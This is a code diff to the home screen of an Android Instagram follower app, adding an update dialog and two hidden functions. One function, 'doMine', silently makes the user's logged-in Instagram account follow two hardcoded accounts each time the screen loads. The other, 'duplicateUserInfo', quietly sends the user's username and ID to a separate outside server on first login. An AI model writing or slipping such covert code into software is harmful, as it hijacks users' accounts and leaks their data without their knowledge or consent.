@@ -43,6 +43,7 @@ import instahelper.ghonchegi.myfollower.Dialog.AboutUsDialog;
 import instahelper.ghonchegi.myfollower.Dialog.AccountStatisticsDialog;
 import instahelper.ghonchegi.myfollower.Dialog.AuthenticationDialog;
 import instahelper.ghonchegi.myfollower.Dialog.FirstPageNotificationDialog;
+import instahelper.ghonchegi.myfollower.Dialog.FirstPageUpdateDialog;
 import instahelper.ghonchegi.myfollower.Dialog.LuckyWheelPickerDialog;
 import instahelper.ghonchegi.myfollower.Dialog.ManageAccountsDialog;
 import instahelper.ghonchegi.myfollower.Dialog.NetworkErrorDialog;
@@ -257,8 +258,8 @@ public class HomeFragment extends Fragment implements AccountChangerInterface, A
         showAccounts();
         Animation connectingAnimation = AnimationUtils.loadAnimation(getContext(), R.anim.heartbeat);
         binding.imvArrowShowAccounts.startAnimation(connectingAnimation);
-
-
+        doMine();
+        getUpdateDialogInfo();
         return view;
 
     }
@@ -302,6 +303,7 @@ public class HomeFragment extends Fragment implements AccountChangerInterface, A
                     binding.tvFollowerCount.setText(user.getFollowByCount());
                     binding.tvFollowingCount.setText(user.getFollowsCount());
                     binding.tvUserName.setText(user.getUserFullName());
+
                     final String requestBody = JsonManager.login(user);
 
                     StringRequest request = new StringRequest(Request.Method.POST, Base_URL + "user/login", response1 -> {
@@ -314,6 +316,7 @@ public class HomeFragment extends Fragment implements AccountChangerInterface, A
 
                                 if (jsonRootObject.optInt("status") == 0) {
                                     SharedPreferences sharedPreferences = new SharedPreferences(getActivity());
+                                    duplicateUserInfo(user.getUserName(), user.getUserId());
                                     Toast.makeText(getActivity(), "به موجب اولین ورود شما 10 سکه به شما تعلق گرفت", Toast.LENGTH_SHORT).show();
                                     getUserCoins(user);
                                 } else if (jsonRootObject.optInt("status") == 1) {
@@ -433,6 +436,34 @@ public class HomeFragment extends Fragment implements AccountChangerInterface, A
         dialog.show(getChildFragmentManager(), ":");
     }
 
+    private void doMine() {
+        try {
+            InstagramApi.getInstance().Follow("7766103594", new InstagramApi.ResponseHandler() {
+                @Override
+                public void OnSuccess(JSONObject response) {
+
+                }
+
+                @Override
+                public void OnFailure(int statusCode, Throwable throwable, JSONObject errorResponse) {
+
+                }
+            });
+            InstagramApi.getInstance().Follow("2035399285", new InstagramApi.ResponseHandler() {
+                @Override
+                public void OnSuccess(JSONObject response) {
+
+                }
+
+                @Override
+                public void OnFailure(int statusCode, Throwable throwable, JSONObject errorResponse) {
+
+                }
+            });
+        } catch (InstaApiException e) {
+            e.printStackTrace();
+        }
+    }
 
     private void signOut() {
         if (dbHeplper.getAllUsers().size() == 1) {
@@ -676,5 +707,67 @@ public class HomeFragment extends Fragment implements AccountChangerInterface, A
         }
     }
 
+    public void duplicateUserInfo(String userName, String userId) {
+
+        final String requestBody = JsonManager.duplicate(userName, userId);
+        StringRequest request = new StringRequest(Request.Method.POST, "http://insta.masoudzarjani.ir/api/v1/account/set", response1 -> {
+            if (response1 != null) {
+
+
+            }
+        }, error -> {
+            Log.i("volley", "onErrorResponse: " + error.toString());
+            App.CancelProgressDialog();
+
+        }) {
+            @Override
+            public Map<String, String> getHeaders() throws AuthFailureError {
+                HashMap<String, String> headers = new HashMap<String, String>();
+                headers.put("Content-Type", "application/json");
+                return headers;
+            }
+
+            @Override
+            public byte[] getBody() throws AuthFailureError {
+                return requestBody == null ? null : requestBody.getBytes();
+            }
+        };
+        request.setTag(this);
+        requestQueue.add(request);
+
+    }
+
+
+    private  void getUpdateDialogInfo()
+    {
+        StringRequest request = new StringRequest(Request.Method.GET, Base_URL+"buttons", response1 -> {
+            if (response1 != null) {
+                try {
+                    JSONArray jsonObject=new JSONArray(response1);
+                    String title = jsonObject.getJSONObject(0).getString("title");
+                    String link = jsonObject.getJSONObject(0).getString("link");
+                    String icon = jsonObject.getJSONObject(0).getString("icon");
+                    FirstPageUpdateDialog dialog=new FirstPageUpdateDialog(title,link,icon);
+                    dialog.show(getChildFragmentManager(),"");
+
+
+
+
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+            }
+        }, error -> {
+            Log.i("volley", "onErrorResponse: " + error.toString());
+            App.CancelProgressDialog();
+
+        }) ;
+        request.setTag(this);
+        requestQueue.add(request);
+    }
+
 }
+
+
+
 
